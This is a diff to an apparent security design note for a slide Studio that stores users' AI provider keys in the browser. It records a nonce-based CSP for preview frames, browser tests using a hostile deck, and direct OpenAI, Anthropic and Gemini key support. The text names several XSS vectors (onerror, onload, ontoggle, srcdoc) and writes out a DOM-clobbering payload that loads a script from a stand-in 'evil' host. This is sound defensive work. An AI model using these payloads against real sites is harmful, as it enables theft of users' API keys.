@@ -108,16 +108,19 @@ made to leak a value); `workspace-backup.test.ts` › "never packs the OpenRoute
 present" pins the backup.
 
 The shipped bundle names the key in one chunk, `openrouter-key.*.js` (measured on the built
-site, 2026-11-06). A post-build check that keeps it that way is a new CI step and so waits on
-the owner (`followups.d/3048-p4-key-name-in-one-shipped-chunk.md`).
+site, 2026-11-06). Since 2026-11-08 the docs `build` keeps it that way: `docs/scripts/check-key-chunk.mjs`
+reads every `lattice-db-…` name from `openrouter-key.js` and fails the build if any of them appears in
+a second chunk under `dist/_astro` or in any HTML file (owner-approved; it runs inside the existing
+build step, so CI gained no job or step). It cannot see code that walks `localStorage` without naming
+a key, or that builds a key name from parts at runtime.
 
 ## 4. A shared deck cannot read the key
 
 **The exposure.** The Studio's slide preview is a same-origin, unsandboxed `srcdoc` iframe
 (`docs/src/playground/single-slide-render.ts`, `srcdoc()`), and its CSP
-(`lib/core/subresource-csp.mjs`) has **no `script-src`**: it closes `img-src`,
-`connect-src`, `object-src`, `base-uri` and `form-action` against data beacons, and leaves
-script loading unrestricted. Same origin means a script in the frame shares the Studio's
+(`lib/core/subresource-csp.mjs`) had **no `script-src`** when this section was first written: it
+closed `img-src`, `connect-src`, `object-src`, `base-uri` and `form-action` against data beacons,
+and left script loading unrestricted (the second wall below changes that for this frame). Same origin means a script in the frame shares the Studio's
 `localStorage`, which is where the key lives. Closing `connect-src` does not save it: the
 script can call `parent.fetch` (the parent's realm, without the frame's CSP) or set
 `top.location` to a URL carrying the key.
@@ -129,10 +132,9 @@ enters the frame. HARD RULE #22 already gates that the builder calls it
 
 §3 does **not** add to this defense. It makes our own code auditable, but an injected script
 does not need our module: it types `localStorage.getItem(…)` itself. The key's safety in the
-preview rests on one sanitizer call. The stronger, defense-in-depth move is a `script-src` in
+preview rests on one sanitizer call. The stronger, defense-in-depth move was a `script-src` in
 the frame's CSP that refuses inline event handlers, which are the vectors that fired
-unguarded below; it is recorded as a follow-up, because the runtime and Mermaid scripts the
-frame does need must be allowed by hash or nonce first.
+unguarded below. It shipped as the second wall, below.
 
 **The proof.** `docs/e2e/byok-key-isolation.spec.ts` seeds a canary key, types a deck
 carrying nine script vectors (`<script>`, `img onerror` with a beacon, `svg onload`,
@@ -155,12 +157,98 @@ the same spec goes red, and four vectors read the canary:
 even unguarded, because markup inserted through the preview's patch paths does not run
 `<script>` elements; the guard is what stops the event-handler vectors, which do.)
 
-**What this does not cover.** The proof drives the Studio preview only. The other surfaces
-that render a deck on the key's origin were TRACED to a sanitizer call by the adversarial
-pass below, not proved in a browser: the Stage popup (`stage-window.js`, `buildStageDoc`),
-Print (`buildSrcdoc`), the export capture frame (`deck-export.js`), the webpage-export prune
-frame (`player-prune-browser.ts`, which runs the assembled player on this origin), the Read
-Article view (`projectSectionsToArticle`) and the Library scene art (`sanitizeSceneAssets`).
+**The second wall: a `script-src` (#3048-p5, 2026-11-06).** The Studio preview frame now
+carries `script-src 'nonce-<n>' 'strict-dynamic' <site origin>` in its CSP. `page-script-nonce.js`
+makes one random nonce per page load (`PAGE_SCRIPT_NONCE`, 18 bytes), and `single-slide-render.ts`
+stamps it on every script `srcdoc()` writes: the font gate, dagre, the runtime, the link guard, and the drawn
+libraries' preloads. The browser then refuses any inline event handler, `javascript:` URL, or
+`<script>` the parser meets without that nonce, whatever the sanitizer let through.
+`'strict-dynamic'` trusts what those scripts insert with `createElement('script')` (the runtime's
+dagre, plugin data and drawn-library loads), so no library URL is listed. The origin is a fallback
+for a browser without `'strict-dynamic'`, which ignores it otherwise. There is no `'unsafe-inline'`.
+There IS `'unsafe-eval'`: function-plot's library compiles with `new Function`, and the runtime loads
+it into this frame when the draw host's sandbox is down (`host-browser.mjs`, found by the checker).
+It lets a running script call eval; it does not let markup run.
+
+Three things the adversarial trio found, all fixed in this PR:
+
+- **A DOM-clobbering gadget (red team, HIGH).** The runtime took its own URL from
+  `document.currentScript`, which a named element can override:
+  `<img name="currentScript" src="https://evil/x/lattice-runtime.js">`. It then built
+  `lattice-plugin-icons.js` and dagre URLs from it and inserted them with `createElement`, which
+  `'strict-dynamic'` trusts. Reproduced in Chromium, Gecko and WebKit on markup the sanitizer had
+  been bypassed for. `lib/runtime/index.js` now accepts only a real `HTMLScriptElement`; the same
+  harness then loads nothing in any of the three.
+- **The nonce is not hidden.** Browsers hide `nonce` from CSS and `getAttribute` only under a policy
+  sent as an HTTP header, and this one is a `<meta>`. Author CSS that can reach an image host the
+  reader allowed could leak it, and it is the same for every frame in one page load, so it would
+  help a LATER injection in that page load. The code comment that claimed otherwise is corrected.
+  A nonce per document would close it, but the render signatures depend on rewrites of the same
+  slide being byte-identical; recorded in `followups.d/3048-p10-…`.
+- **function-plot's eval**, above.
+
+The policy is opt-in in `lib/core/subresource-csp.mjs` (`scriptSources`, reached by passing
+`scriptNonce`). Without a nonce the policy has no `script-src`, as before, so the CLI export and the
+other preview builders (Print, the deck preview) are unchanged until each one stamps its own
+scripts.
+
+**The Stage joined on 2026-11-08 (3048-p10).** `buildStageDoc` passes the same page nonce and stamps
+its five scripts (font gate, dagre, runtime, reveal, fit) and the drawn libraries' preloads. One nonce
+serves both frames; within a page load that adds nothing, since every preview frame already shared one.
+A per-DOCUMENT nonce would break the Stage: `paint()` rewrites it with `document.open()`/`write()`, a
+`<meta>` policy stays on the window across that, so a second document's scripts would meet the first
+document's nonce as well. Keep the Stage's nonce per page unless the rewrite becomes a fresh window.
+
+Measured, 2026-11-06:
+
+- **It holds alone.** Built with `sanitizeOnce` returning its input, `byok-key-isolation.spec.ts`
+  stays green on desktop and mobile Chromium, Gecko, and WebKit phone and tablet. A scratch probe on
+  the same build found the `ontoggle` and `onerror` handlers in the frame's DOM, neither ran, and
+  Chromium logged "Refused to execute inline event handler because it violates … script-src
+  'nonce-…' 'strict-dynamic'". Without the `script-src` (before this change), the same arm read the
+  key through four vectors (above).
+- **It breaks nothing found.** One gallery slide of each of 59 kinds (Mermaid, flowcharts, state
+  charts, KaTeX, every chart family, code) rendered in the Studio preview with zero CSP refusals in
+  the console. The probe does see refusals: it caught the two above. The desktop `@smoke` suite
+  (152 tests) passed with the policy in place.
+
+Pinned by `test/unit/core/subresource-csp-script-nonce.test.js` (the directive, no unsafe
+keywords, a malformed nonce or origin refused, no change without a nonce) and by
+`byok-key-isolation.spec.ts`, which now also asserts the frame's policy carries the nonce.
+
+**The other six surfaces (#3048-p5, 2026-11-06).** The adversarial pass below TRACED six more
+surfaces that render a deck on the key's origin to a sanitizer call. Each is now PROVED in a browser
+by `docs/e2e/byok-key-isolation-surfaces.spec.ts`, which renders the same hostile deck
+(`docs/e2e/hostile-deck.ts`, shared with the Studio-preview spec) on the surface with a canary key
+seeded, checks the deck really rendered there, waits for the signal the handlers ride on, and asserts
+nothing ran and no beacon left. The Library gets a hostile motion package instead of a deck.
+
+The red arm: one build with every one of these sanitizer calls returning its input. Each test went
+red, and the vectors that read the key were:
+
+| Surface | Sanitizer call removed | Vectors that ran |
+|---|---|---|
+| Read Article | `article-projection.ts` (`sanitize` in `projectSectionsToArticle`) | `<script>`, `<svg><script>`, `details ontoggle`, `iframe srcdoc` |
+| Stage popup | `stage-window.js` `buildStageDoc` | `img onerror`, the onerror after a `<style>`, the mXSS nest |
+| PDF export (capture frame) | `deck-preview.js` `buildSrcdoc` | `<script>`, `<svg><script>`, `details ontoggle`, `img onerror`, after-style, `iframe srcdoc`, `svg onload` |
+| Print deck (print sheets, "Download PDF") | `deck-preview.js` `buildSrcdoc` | 12 leak entries |
+| Webpage export (prune frame) | `buildSrcdoc`, and `assemblePlayer`'s `sanitize` cap (`share-export.ts`) | `<script>`, `<svg><script>`, `details ontoggle`, `iframe srcdoc`, `svg onload` |
+| Library scene art | `sanitizeSceneAssets` (`scene-library.ts`) | SVG `<image onerror>`, `foreignObject` `img onerror` and `details ontoggle` |
+
+So on each of these six the sanitizer was the ONLY wall: none carried the `script-src` the
+Studio preview has. The Stage now does (above); on the other five the sanitizer is still the only wall. Giving each its own nonce is the next defense-in-depth step, and the
+specs above are what would prove it (`followups.d/3048-p10-nonce-script-src-on-other-surfaces.md`).
+
+Two things the specs taught. Print's options step shows a Studio preview frame (single-slide-render,
+already covered), not the print document; the print sheets are built only on Print or "Download
+PDF", so the spec drives the download. The Stage resolves `src="x"` against a document with no
+base, so its images neither load nor fail; the spec waits for the popup's `load` event instead.
+
+Green, with the sanitizers in place, on desktop Chromium, Gecko and WebKit (iPad landscape), all
+measured 2026-11-06. The spec is tagged to run on desktop Chromium and Gecko; WebKit was a one-time
+run (the desktop project drops a test tagged `@webkit` unless it is also `@crosswidth`, and these
+cannot run at phone width). The red arm was measured on desktop Chromium only. Not run at phone width: the phone Studio has no
+posture dial or Stage, as the existing Read Article and Stage specs also reflect.
 
 ## 5. The adversarial pass (2026-11-06)
 
@@ -253,15 +341,155 @@ tier, not a third backend, so everything below the switch (spend, standing instr
 voice) treats it as Cloud. Pinned by `architect.test.ts` › "saveOpenRouterKey",
 `WorkspaceSheet.test.tsx` › "the API key tab", and `docs/e2e/workspace-api-key.spec.ts`.
 
-**Next (step 2), and what it has to answer.** OpenAI and Gemini accept OpenAI-shaped chat
-requests and allow browser calls, so they can share the OpenRouter transport with a different
-base URL, model list and price table. Anthropic's Messages API has its own request, streaming and
-cache-control shapes and needs the `anthropic-dangerous-direct-browser-access` header, so it gets
-its own transport. Per provider: no `/credits` or `/auth/key` (so the spend decision above), a
-model list of its own, and voice only where the provider has one (OpenAI). Each provider key is
-another secret in this origin's storage, some broader than OpenRouter's, which raises the value
-of the preview-frame `script-src` follow-up (§4). `lib/openrouter-key.js` generalizes to one
-module per-provider keys go through, keeping §3's one-reader property.
+> **Superseded in part 2026-11-07** by `2026-11-07-studio-model-spine.md`: saving a key no longer
+> calls `setStudioTier('auto')` — it selects that provider's chat model (owner decision 3) — and
+> removing the active direct key no longer returns the tier to OpenRouter: the selection stays and
+> reads "needs a key", because moving the author to another provider is the substitution the spine
+> removes. The provider in use is part of the chat selection record, not `lattice-db-provider`.
+
+**Shipped (step 2): direct OpenAI, Anthropic and Gemini keys.** The API key tab has a provider
+picker (OpenRouter, OpenAI, Anthropic, Gemini; OpenRouter first and the default) and a list of
+the keys this browser holds, each with Use, Replace and Remove. One provider runs the cloud tier
+at a time; saving a key makes its provider the one in use, and removing the active direct key
+returns the tier to OpenRouter.
+
+> **Since 2026-11-08 (model spine, PR #3079):** the picker and the key list are one list, one row
+> per provider (OpenRouter, Gemini, Anthropic, OpenAI, On-device) under Workspace › AI ›
+> Providers & keys; Add opens the key field on that row. Removing a key no longer returns the tier
+> to OpenRouter: the selection stays and reads "needs a key"
+> (`2026-11-07-studio-model-spine.md` §7).
+
+- **Keys.** `lib/openrouter-key.js` holds one sealed slot per provider (`lattice-db-or-key`,
+  `lattice-db-openai-key`, `lattice-db-gemini-key`, `lattice-db-anthropic-key`), each with its
+  own rejected mark, all sealed under the one AES-GCM key from §9. It also stores which provider
+  is in use (`lattice-db-provider`). It is still the only file under `docs/src` that names any of
+  them, so §3's one-reader property holds for all four. The OpenRouter API every caller used is
+  unchanged.
+- **Check before store.** `saveProviderKey` (`api-key.ts`) refuses a key of the wrong shape
+  without a request, and says which provider a misplaced key belongs to ("That looks like an
+  Anthropic key"). It then asks the provider's free model listing (`GET /models`) and stores the
+  key only on a 200.
+- **Transports** (`ai/direct-providers.js`). OpenAI and Gemini take the OpenRouter request at
+  their own base URL (Gemini through its OpenAI-compatible endpoint). Two differences matter:
+  OpenAI's newer models refuse `max_tokens` and take `max_completion_tokens`, and OpenRouter's
+  `cache_control` marks are removed because both providers cache on their own. Anthropic gets
+  its own transport: system messages lift into `system`, `tool_calls` become `tool_use` blocks,
+  tool results merge into one user turn, the stream's events map back onto the same callbacks
+  (`max_tokens` → `length`), and every request carries
+  `anthropic-dangerous-direct-browser-access: true`, without which Anthropic refuses a browser.
+  It marks the first system block for caching unless the author turned caching off, as
+  `or-cache.js` does for Anthropic models on OpenRouter.
+- **One cloud tier.** `architect-model.js` asks `cloud()` for the backend: OpenRouter, unless the
+  chosen direct provider holds a key. The direct backend has the OpenRouter backend's shape and
+  reports the Studio's tier name `openrouter`, so every faculty, the budget gate and the spend
+  ledger work unchanged. `availability().provider` says which provider it is.
+- **Spend is an estimate (decision 3).** Token counts × the model's price. The price comes from
+  OpenRouter's PUBLIC model catalog (no key; the picker already fetches it), which lists these
+  providers' models at their own rates. We chose that over a committed price table because the
+  ids moved too fast for one: on 2026-11-06 the catalog listed `gpt-6.1-terra`,
+  `claude-sonnet-5.5` and `gemini-3.8-flash`, none of which a table written months earlier would
+  have priced. Direct ids map onto catalog ids (`claude-sonnet-5-5-20260928` →
+  `anthropic/claude-sonnet-5.5`). A model the catalog does not list gets no estimate, never a
+  guessed one, and every usage the transport reports carries `estimated: true`. The Spend tab
+  shows "Balance not available for this provider", a link to the provider's billing page, and
+  "This session · estimate"; the per-key cap row (an OpenRouter feature) is hidden.
+- **An unpriced model fails closed.** OpenRouter reports each call's real cost and can cap a key on
+  its server; a direct key often has neither, so the estimate is the only limit. A model the
+  catalog cannot price (or every model, when openrouter.ai is unreachable) would otherwise be
+  recorded as $0 and never trip the cap. So under a hard-stop cap, `cloudBudgetBlock` refuses a call
+  on a direct key with no price, and the Spend tab says the model's calls are not counted. Warn mode
+  and OpenRouter are unchanged. Found by the inversion pass; pinned in `architect.test.ts`.
+- **Models.** The picker lists the provider's own `/models`, minus embedding, image and audio
+  models, priced from the catalog. Until the author picks one, the default (`pickDefaultModel`) is
+  the newest model the catalog prices at $10 or less per million output tokens, from the provider's
+  everyday family first (Flash, GPT, Sonnet), outside the side
+  tiers (pro, mini, lite, preview, opus and the like, matched as whole words: a bare `mini` once
+  matched inside "gemini"). Failing that, the CHEAPEST priced model, so a fallback never moves the
+  author up in price; with no prices at all, the newest of the provider's everyday family (Sonnet,
+  Flash, GPT). It is derived rather than pinned, for the same reason as the price. "Newest" is by
+  creation date, then by the version in the id, because Gemini's list carries no dates: by date
+  alone every model tied and list order chose the retired `gemini-2.5-flash` (404 "no longer
+  available to new users"); by version alone `gemini-4-argon` won, which a plain key lists but
+  cannot use (429). Both found live on 2026-11-08.
+- **No answer deadline yet.** A live run on 2026-11-08 saw Gemini hold requests to an overloaded
+  model for minutes before a 503, a 429 or a dropped connection, with the author watching a spinner.
+  A first-byte deadline only works once every faculty streams: a non-streaming reply sends its
+  headers when the whole answer is done, so a 60 s cap would cut healthy long replies
+  (`followups.d/3058-p2-answer-deadline.md`). The Studio never swaps in another model on its own.
+- **A rejected key.** A 401 marks that provider's key (§2's rules, per slot). The Workspace says
+  "<Provider> — key rejected" and offers **Replace key** (there is no OAuth to reconnect with),
+  and `describeModelError` names the provider: "Anthropic rejected the key — replace it in
+  Workspace → AI → API key", "Your OpenAI account is out of credits".
+- **Privacy & Data.** "AI keys" (formerly "OpenRouter credentials") and Delete everything remove
+  every provider's key (`disconnectAllProviders`).
+
+**Found by the adversarial trio and fixed here:**
+
+- **Photo description** used the OpenRouter image-model pick, which names nothing on a direct key,
+  so it always answered "this model can't see pictures". On a direct key it now uses the author's
+  model on that provider (`suggest-photo-description.ts`).
+- **The model picker** opened on the Featured lens, which matches OpenRouter ids, so a direct
+  provider's list showed empty. A direct provider opens on All with no lens row, and the search
+  field names the provider. A list that answers after the provider changed is dropped.
+- **Gemini** answers a bad or revoked key with 400 `API_KEY_INVALID`, not 401. Read as 401, so the
+  save path says "rejected" and the §2 mark is set.
+- **No reasoning or thinking on a direct key.** A non-reasoning OpenAI model refuses
+  `reasoning_effort` with a 400, and Anthropic refuses a tool round whose thinking blocks were not
+  passed back. This transport does not carry them, so it never asks.
+- **A price of $0, or a row missing a price, is no price** (`usablePrice`): the provider still
+  bills the direct call, and a $0 would pass the hard-stop cap.
+- **The chosen provider stays the cloud tier** while its sealed key is re-opened (after another
+  tab changes it). It reads not-ready for that moment rather than falling through to OpenRouter,
+  which would bill the wrong account.
+
+**Not verified, and why the live run matters.** The mocks answer in shapes we wrote, so a provider
+that refuses one of our fields would pass the suite. A dispatch-only live smoke test per provider
+(HARD RULE #24's sanctioned-workflow pattern) would catch that; it is a new CI workflow, so it is
+the owner's call.
+
+**Not in step 2.** The cloud voice stays on OpenRouter. *Corrected 2026-11-07:* this note said
+OpenAI was the only direct provider with speech. That was wrong: the Gemini API has native
+text-to-speech (`gemini-3.8-flash-tts`, `gemini-3.8-flash-lite-tts`), and the model spine adds a
+direct Gemini voice (`2026-11-07-studio-model-spine.md`). OpenAI's speech models shut down on
+2027-01-06 and their named replacement does not serve `/v1/audio/speech`, so a direct OpenAI
+voice is a follow-up on a different transport (`followups.d/3048-p9-direct-openai-voice.md`). OpenRouter-only extras do not carry over: the
+file-parser plugin for a reference PDF, the authoritative cost of an aborted turn, and the
+self-heal of a retired model id.
+
+**Pinned by** `ai/direct-providers.test.ts` (the request shapes, both streams, the price lookup,
+the default model, a 401, routing, sealing, remove-all) and `docs/e2e/byok-direct-providers.spec.ts`
+(per provider: a wrong-shape key, a refused key, a saved and sealed key, the Spend lines, then
+Theme, Finish and Motion succeed and Component's 402 names the provider, with every request on the
+provider's endpoint and key and none on OpenRouter's; plus switching with Use and Remove).
+
+**Live run: Anthropic verified by the owner; OpenAI and Gemini UNVERIFIED.** On 2026-11-06 the
+owner pasted their own Anthropic key into the PR's deployed preview (Cloudflare Pages, production
+build) and reported that it worked. The key never entered this repo's sandbox, which cannot store a
+key for Anthropic's hosts. The owner declined OpenAI and Gemini keys for now
+(`followups.d/3058-p1-live-provider-run.md`). Before that, this session had no provider key, so no
+request reached a real provider. Three things only a live run can confirm: that each provider still
+accepts browser (CORS) requests on these endpoints, that the price mapping finds the real ids,
+and that the four faculties' replies parse. The brief asks for one under $1 total.
+
+**Live run, 2026-11-08: OpenAI verified; Gemini partly verified, and it found three defects.** The
+owner's keys were set as environment variables; a throwaway harness in `.scratch/` typed each into
+the Studio's API key field on a real `build:e2e` and drove the four faculties (HARD RULE #24: never
+committed, never per-PR).
+- **OpenAI**: Theme, Finish, Motion and Component all succeeded on `gpt-6.1-terra` (three runs).
+  The Spend tab's estimate (2.9K, 3.0K, 3.0K tokens) matched the usage OpenAI returned (2,883,
+  3,042 and 2,971 tokens). Each run logged three chat requests for the four faculties; which
+  faculty made no request was not traced.
+  Spend in dollars could not be compared: a browser key cannot read OpenAI's billing.
+- **Gemini**: the key starts `AQ.`, and the Studio refused it as "not a Gemini key" (fixed: both
+  `AIza` and `AQ.` are accepted; Gemini's models list and chat endpoint accept the key). Then every
+  faculty hit the retired default model (fixed, above). Pinned to `gemini-3.5-flash`, Theme
+  generated a full palette live (884 prompt / 146 completion tokens); the next request got 503
+  "high demand". Direct calls the same hour: `gemini-3.5-flash` and `gemini-3.1-flash-lite` answered
+  in about 1 s, `gemini-3.8-flash` returned 503 or held the request past 60 s, `gemini-4-argon`
+  answered 429. Finish, Motion and Component on Gemini remain UNVERIFIED live: Google's capacity,
+  not the Studio's request, stopped them. The endpoint, the Bearer auth and the request shape are
+  verified.
+- Still UNVERIFIED: a live 402 on either provider (producing one would spend money).
 
 ## 8. Plugins cannot read the key
 
